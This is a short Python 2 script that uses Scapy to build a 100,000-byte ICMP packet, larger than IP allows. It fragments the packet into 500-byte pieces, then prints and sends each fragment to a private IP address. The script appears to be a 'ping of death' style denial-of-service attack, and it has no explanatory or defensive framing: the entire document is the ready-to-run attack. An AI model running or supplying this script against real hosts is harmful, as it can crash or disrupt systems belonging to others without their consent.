from scapy.all import *
dip="192.168.1.106"


ip_hdr = IP(dst=dip)
packet = ip_hdr/ICMP()/("m"*100000) 

frags=fragment(packet,fragsize=500)

counter=1
for fragment in frags:
  print "Packet no#"+str(counter)
  print "==================================================="
  fragment.show() 
  counter+=1
  send(fragment)
